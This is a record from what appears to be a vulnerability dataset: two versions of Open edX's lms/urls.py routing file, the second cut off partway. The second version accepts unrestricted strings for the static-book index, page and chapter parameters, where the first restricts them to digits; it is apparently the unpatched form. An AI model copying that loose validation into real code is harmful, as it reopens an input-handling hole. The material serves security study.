    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0
35,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
